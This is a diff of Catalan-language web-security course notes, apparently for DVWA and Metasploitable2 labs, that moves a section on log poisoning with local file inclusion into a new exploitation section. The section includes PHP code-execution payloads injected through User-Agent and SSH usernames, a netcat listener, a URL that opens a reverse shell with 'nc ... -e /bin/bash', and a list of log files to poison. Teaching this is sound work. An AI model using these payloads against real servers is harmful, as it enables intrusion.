@@ -28,6 +28,7 @@
     <!-- <a href="#atacs">Atacs a http</a>  -->
     <a href="#owasp">OWASP</a>
     <a href="#vuln">Principals Vulnerabilitats</a>   
+    <a href="#explot">Exploitation</a>   
     <a href="#postexpl">Post Exploitation</a>   
     <a href="#labs">Laboratoris</a>
 
@@ -269,71 +270,8 @@ https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
         <p>==> En la màquina DVWA, es proposa la URL ..</p>
         <code>/dvwa/vulnerabilities/fi/?page=file1.php</code>
 
-        <h3>Execució remota de codi (RCE) mitjantçant  <em>log poisoning + LFI</em></h3>
-        <p>Per conseguir una execució remota de codi, es necessari trovar la forma de escriure en algun fitxer, inserir codi en ell, i després 
-          visualitzar el fitxer amb LFI. Una tècnica per fer això és el <em>log poisoning</em> o enverinament de logs.      </p>
-
-         <p>Una forma es utilitzar el fitxer <code>/var/log/apache2/access</code> .  Este fitxer registra tots els accesos al servidor web.</p>
-         <p>El valor <em>User-Agent</em> és el tipus de navegador que està accedint, i queda registrat.</p>
-         <p>La informació de <em>User-Agent</em> es pot canviar amb BurpSuite o ZAP, interceptant el http-request, i modificant el contingut</p>
-         <p>Per exemple, podem posar un codi php :   <code> User-Agent: &lt;?php system('uname -a');?></code></p>
-         <p>Una vegada modificat el http-request i enviat al servidor, este valor (codi maliciós) quedarà escrit en el <em>log</em></p>
-         <p>Sols ens queda visualitzar amb LFI el fitxer log, i el codi inserit s'executarà ==> <strong> (RCE)</strong> </p>
-         <p>En la barra del navegador:  <code>https://exemple.com/pagina.php?lang=/var/log/apache/access.log</code></p>
-         <p>En este cas, sols per provar, s'ha inserit una simple ordre que mostra informació del sistema, però de igual manera
-          es podria inserir un sezill codi que execute una  <strong>shell inversa</strong>, obrint un terminal interactiu que 
-          permetria executar comandos directament.    </p>
-          <ul>Passos a seguir:
-            <li>Primer. Tindre accés mitjantçant LFI a algun fitxer de <em>log</em></li> 
-            <li>Segon. Escriure dins del fitxer</li>
-            <li>Tercer. Preparar nc a la escolta, en maquina atacant (preparació de reverse-shell)</li>
-            <li>Quart: Obrir url amb codi nc de connexió al que escolta en la maquina atacant</li>
-            <li>La pestanya del navegador es queda 'pensant' i ja està la reverse shell connectada</li>
-          </ul>
-          
-          <h4>Altres fitxers interessants per fer log poisoning:    </h4>
-          <ul>
-            <li>/var/log/auth.log</li>
-            <code>ssh '&lt;?php system($_GET[cmd]);?>@ip_victima' <br></code> o <br>
-            <code>ssh '&lt;?php shell_exec($_GET[cmd]);?>@ip_victima'</code>
-            <p>⚠️ El ssh s'executarà des d'una distribució kali o similar, perquè en una normal, no deixa, previament a enviar, higienitza la cadena i dona error !!</p>
-            <p class="alert"> Si el codi inserit no es correcte, al carregar la pàgina, donarà error i es pedrà el fitxer com a vector d'atac</p>
-            <p>En kali, en una terminal, posem <code>nc -lnvp 444</code> (estem preparant la reverse shell)</p>
-            <code>en barra de navegador......index.php?page=/var/log/auth.log&cmd=nc 10.0.2.15 4444 -e /bin/bash</code>
-            <li>/var/log/vsftpd.log</li>
-            <code>Accedir al servidor ftp, posant en el nom d'usuari el codi a inserir</code>
-            <li>/var/log/apache2/error.log</li>
-            <code>User-Agent de http-request</code>
-            <li>/proc/self/environ</li>
-            <li>/proc/self/fd</li>
-          </ul>
-          <p>Abans de fer el log poisoning, s'ha de comprovar si es disposa d'accés a algun d'estos fitxers.</p>
-          <h4>Estabilitzar shell</h4>
-          <p>És molt recomanable estabilitzar una shell inversa després d'obtenir-la amb nc (netcat), sobretot en un entorn de hacking ètic o pentesting controlat.
-             Una shell sense estabilitzar és limitada i pot comportar problemes pràctics durant l’execució de comandes.</p>
-          <ul>Les shells bàsiques obtingudes amb nc solen tenir aquests inconvenients
-            <li>No permeten usar tecles especials (com Ctrl+C, fletxes, Tab per autocompletar...)</li>
-            <li>No són PTY interactives, cosa que impedeix executar eines com ssh, sudo, nano, top, etc</li>
-            <li>Si la connexió es trenca, la sessió pot quedar corrupta.</li>
-            <li>Dificulten executar programes que requereixin TTY</li>
-          </ul>
-          <p>Estabilitzar la shell resol tots aquests problemes i et dóna una sessió molt més funcional.</p>
-          <ul>🛠️ Maneres de estabilitzar una shell
-            <li>Obtenir un PTY amb Python (la més popular)</li>
-            <li>Utilitzar script</li>
-            <li>Utilitzar rlwrap des del teu costat</li>
-            <li>Millorar la shell amb socat</li>
-          </ul>
-          <pre>Primer s'ha de comprovar si es disposa d'alguna d'estes eines
-which python3
-which socat
-which script
-Si existeix, l'ordre retorna on està l'executable, si no existeix no retorna res
-          </pre>
-          <p class="alert"> En la màquina Metasploitable2, les tecles no van be, s'ha de posar un comando per aixó : 
-            <code>sudo loadkeys es</code>
-          </p>
-
+        
+         
           <h4>Wrappers en php</h4>
           <p>En principi per explotar LFI usarem</p>
           <code>/dvwa/vulnerabilities/fi/?page=include.php</code>
@@ -653,6 +591,83 @@ en el navegador , posem la ip de la victima seguit del codi RFI
 
     
       </section>         
+
+      <section id="explot">
+      <h1>Explotació</h1>
+       <h3> Log poisoning</h3>
+         <p>Una forma es utilitzar el fitxer <code>/var/log/apache2/access.log</code> .  Este fitxer registra tots els accesos al servidor web.</p>
+         <p>El valor <em>User-Agent</em> és el tipus de navegador que està accedint, i queda registrat.</p>
+         <p>La informació de <em>User-Agent</em> es pot canviar amb BurpSuite o ZAP, interceptant el http-request, i modificant el contingut</p>
+         <p>Per exemple, podem posar un codi php :   <code> User-Agent: &lt;?php system('uname -a');?></code></p>
+         <p>Una vegada modificat el http-request i enviat al servidor, este valor (codi maliciós) quedarà escrit en el <em>log</em></p>
+         <p>Sols ens queda visualitzar amb LFI el fitxer log, i el codi inserit s'executarà ==> <strong> (RCE)</strong> </p>
+         <p>En la barra del navegador:  <code>https://exemple.com/pagina.php?lang=/var/log/apache/access.log</code></p>
+         
+         <h3>RCE</h3>
+        <h3>Execució remota de codi (RCE) mitjantçant  <em>log poisoning + LFI</em></h3>
+        <p>Per conseguir una execució remota de codi, es necessari trovar la forma de escriure en algun fitxer, inserir codi en ell, i després 
+          visualitzar el fitxer amb LFI. Una tècnica per fer això és el <em>log poisoning</em> o enverinament de logs.      </p>
+
+
+         <p>En este cas, sols per provar, s'ha inserit una simple ordre que mostra informació del sistema, però de igual manera
+          es podria inserir un sezill codi que execute una  <strong>shell inversa</strong>, obrint un terminal interactiu que 
+          permetria executar comandos directament.    </p>
+          <ul>Passos a seguir:
+            <li>Primer. Tindre accés mitjantçant LFI a algun fitxer de <em>log</em></li> 
+            <li>Segon. Escriure dins del fitxer</li>
+            <li>Tercer. Preparar nc a la escolta, en maquina atacant (preparació de reverse-shell)</li>
+            <li>Quart: Obrir url amb codi nc de connexió al que escolta en la maquina atacant</li>
+            <li>La pestanya del navegador es queda 'pensant' i ja està la reverse shell connectada</li>
+          </ul>
+          
+          <h4>Altres fitxers interessants per fer log poisoning:    </h4>
+          <ul>
+            <li>/var/log/auth.log</li>
+            <code>ssh '&lt;?php system($_GET[cmd]);?>@ip_victima' <br></code> o <br>
+            <code>ssh '&lt;?php shell_exec($_GET[cmd]);?>@ip_victima'</code>
+            <p>⚠️ El ssh s'executarà des d'una distribució kali o similar, perquè en una normal, no deixa, previament a enviar, higienitza la cadena i dona error !!</p>
+            <p class="alert"> Si el codi inserit no es correcte, al carregar la pàgina, donarà error i es pedrà el fitxer com a vector d'atac</p>
+            <p>En kali, en una terminal, posem <code>nc -lnvp 444</code> (estem preparant la reverse shell)</p>
+            <code>en barra de navegador......index.php?page=/var/log/auth.log&cmd=nc 10.0.2.15 4444 -e /bin/bash</code>
+            <li>/var/log/vsftpd.log</li>
+            <code>Accedir al servidor ftp, posant en el nom d'usuari el codi a inserir</code>
+            <li>/var/log/apache2/error.log</li>
+            <code>User-Agent de http-request</code>
+            <li>/proc/self/environ</li>
+            <li>/proc/self/fd</li>
+          </ul>
+          <p>Abans de fer el log poisoning, s'ha de comprovar si es disposa d'accés a algun d'estos fitxers.</p>
+
+          <h3>Estabilitzar shell</h3>
+          <p>És molt recomanable estabilitzar una shell inversa després d'obtenir-la amb nc (netcat), sobretot en un entorn de hacking ètic o pentesting controlat.
+             Una shell sense estabilitzar és limitada i pot comportar problemes pràctics durant l’execució de comandes.</p>
+          <ul>Les shells bàsiques obtingudes amb nc solen tenir aquests inconvenients
+            <li>No permeten usar tecles especials (com Ctrl+C, fletxes, Tab per autocompletar...)</li>
+            <li>No són PTY interactives, cosa que impedeix executar eines com ssh, sudo, nano, top, etc</li>
+            <li>Si la connexió es trenca, la sessió pot quedar corrupta.</li>
+            <li>Dificulten executar programes que requereixin TTY</li>
+          </ul>
+          <p>Estabilitzar la shell resol tots aquests problemes i et dóna una sessió molt més funcional.</p>
+          <ul>🛠️ Maneres de estabilitzar una shell
+            <li>Obtenir un PTY amb Python (la més popular)</li>
+            <li>Utilitzar script</li>
+            <li>Utilitzar rlwrap des del teu costat</li>
+            <li>Millorar la shell amb socat</li>
+          </ul>
+          <pre>Primer s'ha de comprovar si es disposa d'alguna d'estes eines
+which python3
+which socat
+which script
+Si existeix, l'ordre retorna on està l'executable, si no existeix no retorna res
+          </pre>
+          <p class="alert"> En la màquina Metasploitable2, les tecles no van be, s'ha de posar un comando per aixó : 
+            <code>sudo loadkeys es</code>
+          </p>
+
+        
+
+      </section>
+
 
       <section id="postexpl">
         <h1>Post explotació</h1>
